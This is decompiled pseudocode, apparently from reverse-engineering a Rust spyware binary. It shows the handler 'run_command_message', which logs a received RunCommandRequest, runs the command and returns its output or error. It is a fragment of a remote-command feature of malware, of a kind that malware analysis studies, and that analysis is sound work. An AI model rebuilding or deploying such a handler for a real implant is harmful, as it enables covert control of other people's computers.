__int64 __fastcall spyware::actions::commands::run_command_message(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  char v3; // r15
  int v4; // ebp
  __int64 v5; // rax
  __int128 v7; // [rsp+0h] [rbp-C8h] BYREF
  const char *v8; // [rsp+10h] [rbp-B8h]
  __int64 v9; // [rsp+18h] [rbp-B0h]
  __int64 v10; // [rsp+20h] [rbp-A8h]
  _QWORD v11[2]; // [rsp+30h] [rbp-98h] BYREF
  __int128 v12; // [rsp+40h] [rbp-88h] BYREF
  const char *v13; // [rsp+50h] [rbp-78h]
  __int64 v14; // [rsp+58h] [rbp-70h]
  __int64 v15; // [rsp+60h] [rbp-68h]
  __int128 v16; // [rsp+70h] [rbp-58h] BYREF
  __int64 v17; // [rsp+80h] [rbp-48h]
  __int128 v18; // [rsp+90h] [rbp-38h] BYREF
  __int64 v19; // [rsp+A0h] [rbp-28h]

  if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 4 )
  {
    *(_QWORD *)&v18 = a2;
    *(_QWORD *)&v16 = &v18;
    *((_QWORD *)&v16 + 1) = <&T as core::fmt::Display>::fmt;
    *(_QWORD *)&v12 = &off_BA0B8;
    *((_QWORD *)&v12 + 1) = 2LL;
    v15 = 0LL;
    v13 = (const char *)&v16;
    v14 = 1LL;
    *(_QWORD *)&v7 = aSpywareActions_2;
    *((_QWORD *)&v7 + 1) = 26LL;
    v8 = aSpywareActions_2;
    v9 = 26LL;
    v10 = log::__private_api::loc(&off_BA0F8);
    log::__private_api::log(&v12, 4LL, &v7);
  }
  spyware::actions::commands::run_command((__int64)&v18, *(_QWORD *)(a2 + 8), *(_QWORD *)(a2 + 16));
  if ( __OFSUB__(0LL, (_QWORD)v18) )
  {
    v11[0] = *((_QWORD *)&v18 + 1);
    if ( core::sync::atomic::atomic_load() )
    {
      *(_QWORD *)&v16 = v11;
      *((_QWORD *)&v16 + 1) = <std::io::error::Error as core::fmt::Display>::fmt;
      *(_QWORD *)&v12 = &off_BA0E8;
      *((_QWORD *)&v12 + 1) = 1LL;
      v15 = 0LL;
      v13 = (const char *)&v16;
      v14 = 1LL;
      v2 = log::__private_api::loc(&off_BA128);
      *(_QWORD *)&v7 = aSpywareActions_2;
      *((_QWORD *)&v7 + 1) = 26LL;
      v8 = aSpywareActions_2;
      v9 = 26LL;
      v10 = v2;
      log::__private_api::log(&v12, 1LL, &v7);
    }
    <T as alloc::slice::hack::ConvertVec>::to_vec(&v12);
    v8 = v13;
    v7 = v12;
    std::io::error::repr_bitpacked::decode_repr(&v12, v11[0]);
    v3 = v12;
    v4 = DWORD1(v12);
    <T as alloc::string::SpecToString>::spec_to_string(&v12, v11);
    *(_QWORD *)(a1 + 40) = v13;
    *(_OWORD *)(a1 + 24) = v12;
    *(_QWORD *)(a1 + 16) = v8;
    *(_OWORD *)a1 = v7;
    *(_DWORD *)(a1 + 48) = v3 != 0 ? -1 : v4;
    core::ptr::drop_in_place<std::io::error::Error>(v11[0]);
  }
  else
  {
    v17 = v19;
    v16 = v18;
    if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 4 )
    {
      v11[0] = &v16;
      v11[1] = <alloc::string::String as core::fmt::Display>::fmt;
      *(_QWORD *)&v12 = &off_BA0D8;
      *((_QWORD *)&v12 + 1) = 1LL;
      v15 = 0LL;
      v13 = (const char *)v11;
      v14 = 1LL;
      v5 = log::__private_api::loc(&off_BA110);
      *(_QWORD *)&v7 = aSpywareActions_2;
      *((_QWORD *)&v7 + 1) = 26LL;
      v8 = aSpywareActions_2;
      v9 = 26LL;
      v10 = v5;
      log::__private_api::log(&v12, 4LL, &v7);
    }
    *(_QWORD *)(a1 + 16) = v17;
    *(_OWORD *)a1 = v16;
    *(_QWORD *)(a1 + 24) = 0x8000000000000000LL;
  }
  core::ptr::drop_in_place<spyware::communication::messages::RunCommandRequest>(a2);
  return a1;
}